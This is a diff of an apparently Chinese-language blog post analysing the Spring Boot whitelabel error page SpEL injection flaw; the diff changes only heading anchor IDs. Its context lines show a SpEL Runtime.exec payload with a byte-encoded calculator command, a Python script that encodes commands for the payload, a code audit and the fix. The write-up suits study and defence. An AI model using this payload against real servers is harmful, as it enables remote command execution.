@@ -168,7 +168,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-3"><span class="nav-number">1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-2"><span class="nav-number">2.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">3.1.</span> <span class="nav-text">RCE注意事项</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-6"><span class="nav-number">4.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POP%E9%93%BE-3"><span class="nav-number">5.</span> <span class="nav-text">POP链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">6.</span> <span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83-9"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C-16"><span class="nav-number">8.</span> <span class="nav-text">完</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-2"><span class="nav-number">1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-number">2.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">3.1.</span> <span class="nav-text">RCE注意事项</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-5"><span class="nav-number">4.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POP%E9%93%BE-2"><span class="nav-number">5.</span> <span class="nav-text">POP链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">6.</span> <span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83-8"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C-16"><span class="nav-number">8.</span> <span class="nav-text">完</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -316,12 +316,12 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="漏洞简介-3">漏洞简介</h2>
+        <h2 id="漏洞简介-2">漏洞简介</h2>
 <p>向一个可以能引发报错的controller传参，报错时会渲染出报错页面对输入的参数SPEL解析</p>
-<h2 id="影响范围-2">影响范围</h2>
+<h2 id="影响范围">影响范围</h2>
 <p>Springboot: 1.1.0 ~ 1.1.12、1.2.0 ~ 1.2.7、1.3.0</p>
 <span id="more"></span>
-<h2 id="漏洞复现-4">漏洞复现</h2>
+<h2 id="漏洞复现-3">漏洞复现</h2>
 <p>新建Springboot项目，设置为受影响的版本</p>
 <img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/1.png" class="">
 <p>编写一个通过输入能抛出错误的controller</p>
@@ -333,7 +333,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x6f</span>,<span class="number">0x70</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x2d</span>,<span class="number">0x61</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>&#125;))&#125;</span><br></pre></td></tr></table></figure>
 <p>ascii转换：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;open -a Calculator&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure>
-<h2 id="代码审计-6">代码审计</h2>
+<h2 id="代码审计-5">代码审计</h2>
 <p>从报错页面渲染开始，在org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</p>
 <img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/3.png" class="">
 <p>this.template是报错页面的模板，渲染该页面是通过SPEL表达式解析来达到参数替换</p>
@@ -354,7 +354,7 @@
 <img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/10.png" class="">
 <p>就在此时解析了可控输入产生漏洞</p>
 <img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/11.png" class="">
-<h2 id="POP链-3">POP链</h2>
+<h2 id="POP链-2">POP链</h2>
 <img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/12.png" class="">
 <h2 id="漏洞修复">漏洞修复</h2>
 <p>漏洞产生是由于先从模板递归+SPEL解析出占位符message的值，然后又对message的值递归+SPEL解析，<strong>两次操作使用的是同一个方法</strong>，而本质上只需要在从模板中解析占位符时候调用SPEL，无需对值进行解析</p>
@@ -370,7 +370,7 @@
 <p>返回null就不会进行递归解析了</p>
 <img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/17.png" class="">
 <p>更新后把模板占位符和具体替换值分开操作而不公用同一个方法，仅对占位符进行解析而不解析具体值，从而避免了非法注入</p>
-<h2 id="参考-9">参考</h2>
+<h2 id="参考-8">参考</h2>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/10183137.html">https://www.cnblogs.com/litlife/p/10183137.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit#0x01whitelabel-error-page-spel-rce">https://github.com/LandGrey/SpringBootVulExploit#0x01whitelabel-error-page-spel-rce</a></p>
